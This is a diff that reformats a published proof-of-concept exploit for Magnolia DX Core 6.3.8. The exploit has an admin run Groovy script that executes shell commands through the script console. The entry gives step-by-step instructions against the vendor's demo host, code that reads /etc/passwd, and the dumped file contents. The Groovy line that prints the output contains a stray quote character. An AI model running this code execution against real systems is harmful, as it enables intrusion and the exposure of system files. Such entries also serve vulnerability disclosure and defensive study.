@@ -1,26 +1,25 @@
-# Exploit Title: Magnolia DX Core 6.3.8 - Command Injection
-# Date: 05/16/2025
-# Exploit Author: tmrswrr
-# Version: 6.3.8
-# Vendor home page : https://docs.magnolia-cms.com/home/
-# Product : https://docs.magnolia-cms.com/product-docs/6.3/releases/release-notes-for-magnolia-cms-6.3.8/
-# Demo : https://docs.magnolia-cms.com/product-docs/6.3/getting-started-with-magnolia/demo/
+# Exploit Title: Magnolia DX Core 6.3.8 - Command Injection  
+# Date: 05/16/2025  
+# Exploit Author: tmrswrr  
+# Version: 6.3.8  
+# Vendor home page: https://docs.magnolia-cms.com/home/  
+# Product: https://docs.magnolia-cms.com/product-docs/6.3/releases/release-notes-for-magnolia-cms-6.3.8/  
+# Demo: https://docs.magnolia-cms.com/product-docs/6.3/getting-started-with-magnolia/demo/  
 
+1) Authenticate as an admin:  
+   `https://demoauthor.magnolia-cms.com/.magnolia/admincentral`  
+2) Navigate to **Development > Groovy > Add Script**  
+3) Inject Groovy Script:
 
-1) Authenticate as an admin:
-https://demoauthor.magnolia-cms.com/.magnolia/admincentral
-2)After go to Development > Groovy > Add Script
-3)Inject Groovy Script:
+   ```groovy
+   def process = "cat /etc/passwd".execute()
+   def output = new StringBuffer()
+   process.consumeProcessOutput(output, System.err)
+   process.waitFor()
 
-def process = "cat /etc/passwd".execute()
-def output = new StringBuffer()
-process.consumeProcessOutput(output, System.err)
-process.waitFor()
-
-println ${output}"
-
-Result:
-
+   println ${output}```
+Result : 
+```
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -39,4 +38,4 @@ list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
 irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
 _apt:x:42:65534::/nonexistent:/usr/sbin/nologin
 nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash```
